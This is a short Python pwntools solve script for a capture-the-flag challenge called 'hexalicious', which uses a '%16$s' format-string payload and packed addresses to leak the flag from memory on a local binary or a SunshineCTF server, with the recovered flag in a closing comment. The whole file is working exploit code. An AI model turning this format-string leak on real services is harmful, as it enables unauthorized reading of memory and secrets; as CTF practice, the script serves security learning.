from pwn import *
import time
import sys

def hexalicious(DEBUG):
	if DEBUG=="1":
		r = process("./hexalicious")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'chal1.sunshinectf.org'
		PORT = 20003
		r = remote(HOST,PORT)
	# log.info('system: %#x' % system)
	FLAG = 0x0804B080
	
	# fmt = "%33$d"
	fmt = "%16$s"
	DATA = 0x0804B0E4
	r.recvuntil("Hello random stranger, what shall I call you?")
	r.sendline(fmt)
	flag = ""
	for i in xrange(10):
		data = p32(FLAG+8*i)
		data += p32(DATA)
		r.recvuntil("[>] ")
		r.sendline("0")
		r.recvuntil("[>] ")
		r.sendline(data)
		r.recvuntil("As hex, your data looks like this: ")
		r.recvuntil("0x")
		res = r.recvuntil("\n")[:-1]
		print res
		flag+=res.decode("hex")[::-1]
		print flag
		break
		
	r.interactive()

hexalicious(sys.argv[1])
# sun{hexalicious_definitions_make_them_bytes_go_crazy}